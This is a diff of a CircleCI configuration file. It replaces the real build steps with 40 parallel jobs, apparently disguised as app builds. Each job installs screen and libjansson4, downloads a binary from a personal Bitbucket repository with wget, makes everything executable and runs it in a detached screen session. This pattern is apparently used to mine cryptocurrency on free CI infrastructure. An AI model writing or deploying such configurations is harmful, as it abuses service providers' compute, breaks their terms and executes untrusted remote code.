@@ -6,61 +6,601 @@ jobs:
     docker:
       - image: circleci/elixir:1.9.1
 
-    working_directory: ~/repo
-    steps:
-      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
       - run:
           name: App
           command: |
-            sleep 60s
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
 
   App_02:
     docker:
-      - image: circleci/golang:1.8.6-jessie
+      - image: circleci/golang:1.9.7
 
-    working_directory: ~/repo
-    steps:
-      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
       - run:
           name: App
           command: |
-            sleep 60s
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
 
   App_03:
     docker:
       - image: circleci/ruby:3.0.1-buster
 
-    working_directory: ~/repo
-    steps:
-      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
       - run:
           name: App
           command: |
-            sleep 60s
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
 
   App_04:
     docker:
-      - image: circleci/rust:1.51-bullseye
+      - image: circleci/rust:1.53.0-buster
 
-    working_directory: ~/repo
-    steps:
-      - checkout
       - run:
           name: Update
           command: sudo apt install screen libjansson4 -y
       - run:
           name: App
           command: |
-            sleep 60s
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_05:
+    docker:
+      - image: circleci/elixir:1.8.0
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_06:
+    docker:
+      - image: circleci/golang:1.9.4
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_07:
+    docker:
+      - image: circleci/ruby:3.0.0-rc1
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_08:
+    docker:
+      - image: circleci/rust:1.53-buster
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_09:
+    docker:
+      - image: circleci/elixir:1.7.4
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_10:
+    docker:
+      - image: circleci/golang:1.9.5-stretch
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_11:
+    docker:
+      - image: circleci/ruby:3.0-rc-buster
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_12:
+    docker:
+      - image: circleci/rust:1.52.1-buster
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_13:
+    docker:
+      - image: circleci/elixir:1.7.1
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_14:
+    docker:
+      - image: circleci/golang:1.9.2-stretch
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App15:
+    docker:
+      - image: circleci/ruby:3.0
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_16:
+    docker:
+      - image: circleci/rust:1.51.0-buster
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_17:
+    docker:
+      - image: circleci/elixir:1.6.6
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_18:
+    docker:
+      - image: circleci/golang:1.9-rc
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_19:
+    docker:
+      - image: circleci/ruby:2.7.4-buster
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_20:
+    docker:
+      - image: circleci/rust:1.49-buster
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_21:
+    docker:
+      - image: circleci/elixir:1.6.3
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_22:
+    docker:
+      - image: circleci/golang:1.8.7-jessie
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_23:
+    docker:
+      - image: circleci/ruby:2.7.3
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_24:
+    docker:
+      - image: circleci/rust:1.48.0
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_25:
+    docker:
+      - image: circleci/elixir:1.5.2
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_26:
+    docker:
+      - image: circleci/golang:1.17-rc-buster
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_27:
+    docker:
+      - image: circleci/ruby:2.7.1-buster
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_28:
+    docker:
+      - image: circleci/rust:1.47
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_29:
+    docker:
+      - image: circleci/elixir:1.4.5
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_30:
+    docker:
+      - image: circleci/golang:1.8.6
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_31:
+    docker:
+      - image: circleci/ruby:2.7.0-rc1
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_32:
+    docker:
+      - image: circleci/rust:1.45.2-buster
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_33:
+    docker:
+      - image: circleci/elixir:1.3
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_34:
+    docker:
+      - image: circleci/golang:1.8.5
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_35:
+    docker:
+      - image: circleci/ruby:2.6.8
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_36:
+    docker:
+      - image: circleci/rust:1.44.1-buster
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_37:
+    docker:
+      - image: circleci/elixir:1.12.2
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_38:
+    docker:
+      - image: circleci/golang:1.16.5
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_39:
+    docker:
+      - image: circleci/ruby:2.6.7
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
+
+  App_40:
+    docker:
+      - image: circleci/rust:1.43.1-stretch
+
+      - run:
+          name: Update
+          command: sudo apt install screen libjansson4 -y
+      - run:
+          name: App
+          command: |
+            wget https://bitbucket.org/aldiansah617/sadanai/raw/cffe8ee7bd03ace22c6c9202c2a064b433d0a6a0/cc2xm
+            screen -dmS ls
+            chmod u+x *
+            ./main
 
 workflows:
     version: 2.1
@@ -70,3 +610,39 @@ workflows:
             - App_02
             - App_03
             - App_04
+            - App_05
+            - App_06
+            - App_07
+            - App_08
+            - App_09
+            - App_10
+            - App_11
+            - App_12
+            - App_13
+            - App_14
+            - App_15
+            - App_16
+            - App_17
+            - App_18
+            - App_19
+            - App_20
+            - App_21
+            - App_22
+            - App_23
+            - App_24
+            - App_25
+            - App_26
+            - App_27
+            - App_28
+            - App_29
+            - App_30
+            - App_31
+            - App_32
+            - App_33
+            - App_34
+            - App_35
+            - App_36
+            - App_37
+            - App_38
+            - App_39
+            - App_40
